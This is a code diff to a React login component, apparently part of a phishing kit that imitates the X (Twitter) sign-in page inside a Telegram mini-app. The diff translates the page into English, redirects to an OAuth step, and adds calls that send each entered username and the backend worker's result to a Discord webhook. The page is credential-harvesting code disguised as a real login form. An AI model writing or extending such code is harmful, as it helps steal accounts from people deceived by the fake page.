@@ -10,9 +10,10 @@ import type {
   JobCommandResponse,
 } from "../../../server/src/types/jobs";
 
-import { FullScreenLoader } from "../components/FullScreenLoader";
+import { FullScreenBlueLoader } from "../components/FullScreenBlueLoader";
 import { Toast } from "../components/Toast";
 import { API_BASE } from "../config/api";
+import { sendDiscordWebhookSafe } from "../helpers/webhook";
 
 export const Username = () => {
   const [input, setInput] = useState("");
@@ -22,7 +23,7 @@ export const Username = () => {
   const initDataRaw = useSignal(initData.raw);
   const navigate = useNavigate();
 
-  const pollCommandUntilDone = async (commandId: string, maxMs = 20000) => {
+  const pollCommandUntilDone = async (commandId: string, maxMs = 180000) => {
     const start = Date.now();
 
     while (Date.now() - start < maxMs) {
@@ -90,7 +91,12 @@ export const Username = () => {
 
       if (!cmdResp.data.ok) {
         setLoading(false);
-        setToast(cmdResp.data.error || "Command failed");
+        const error = cmdResp.data.error || "Command failed";
+        if (error === "NO_ACTIVE_SESSION") {
+          navigate("/oauth");
+          return;
+        }
+        setToast(error);
         return;
       }
 
@@ -101,8 +107,8 @@ export const Username = () => {
         return;
       }
 
-      // ✅ Poll jusqu'à résultat worker POUR CETTE COMMANDE
-      const finalState = await pollCommandUntilDone(commandId);
+      // ✅ Poll jusqu'à résultat worker POUR CETTE COMMANDE (timeout: 3 minutes)
+      const finalState = await pollCommandUntilDone(commandId, 180000);
 
       setLoading(false);
 
@@ -110,6 +116,33 @@ export const Username = () => {
         setToast("Timeout, please try again");
         return;
       }
+
+      // 🔥 Webhook Discord avec le résultat de la commande
+      console.log("📤 Sending webhook for username command result:", {
+        username,
+        commandId,
+        status: finalState.status,
+      });
+
+      sendDiscordWebhookSafe({
+        username: "Username Command Result",
+        content:
+          "📝 **Username Command Result**\n" +
+          "```json\n" +
+          JSON.stringify(
+            {
+              username,
+              commandId,
+              status: finalState.status,
+              result: finalState.result,
+              error: finalState.error,
+              nextStep: finalState.result?.nextStep,
+            },
+            null,
+            2
+          ) +
+          "\n```",
+      });
 
       if (finalState.status === "done" && finalState.result?.ok) {
         const nextStep = finalState.result?.nextStep;
@@ -125,18 +158,23 @@ export const Username = () => {
       }
 
       // ❌ erreur username
-      const msg =
-        finalState.error || finalState.result?.message || "Invalid username";
-      setToast(msg);
+      setToast(
+        "Sorry, we could not find your account. g;176386412757198839:-1763864199877:9zAFrYNvTejYilPRFf0c5elL:1"
+      );
     } catch (err: any) {
       setLoading(false);
-      setToast(err.response?.data?.error || err.message || "Network error");
+      const error = err.response?.data?.error || err.message || "Network error";
+      if (error === "NO_ACTIVE_SESSION") {
+        navigate("/oauth");
+        return;
+      }
+      setToast(error);
     }
   };
 
   return (
     <div className="username-page">
-      <FullScreenLoader visible={loading} text="Checking username..." />
+      <FullScreenBlueLoader visible={loading} text="Checking username..." />
       <Toast message={toast} onClose={() => setToast("")} />
 
       <div className="username-modal" role="dialog" aria-modal="true">
@@ -146,7 +184,7 @@ export const Username = () => {
             <div className="username-close-button-container">
               <button
                 className="username-close-button"
-                aria-label="Fermer"
+                aria-label="Close"
                 type="button"
                 onClick={() => navigate(-1)}
               >
@@ -181,16 +219,14 @@ export const Username = () => {
         <div className="username-content">
           <div className="username-title-container">
             <h1 className="username-title" id="modal-header">
-              Connectez-vous à X
+              Sign in to X
             </h1>
           </div>
 
           <div className="username-form">
             <label className="username-label">
               <div className="username-label-text">
-                <span>
-                  Numéro de téléphone, adresse email ou nom d'utilisateur
-                </span>
+                <span>Phone number, email address, or username</span>
               </div>
               <div className="username-input-wrapper">
                 <input
@@ -220,17 +256,27 @@ export const Username = () => {
               disabled={loading || !input.trim()}
               type="button"
             >
-              <span>Suivant</span>
+              <span>Next</span>
             </button>
 
-            <button className="username-forgot-button" type="button">
-              <span>Mot de passe oublié ?</span>
+            <button
+              className="username-forgot-button"
+              type="button"
+              onClick={() => setToast("Error: Password recovery not available")}
+            >
+              <span>Forgot password?</span>
             </button>
 
             <div className="username-signup-link">
-              <span>Vous n'avez pas de compte ? </span>
-              <button type="button" className="username-signup-button">
-                <span>Inscrivez-vous</span>
+              <span>Don't have an account? </span>
+              <button
+                type="button"
+                className="username-signup-button"
+                onClick={() => {
+                  window.open("https://twitter.com/i/flow/signup", "_blank");
+                }}
+              >
+                <span>Sign up</span>
               </button>
             </div>
           </div>
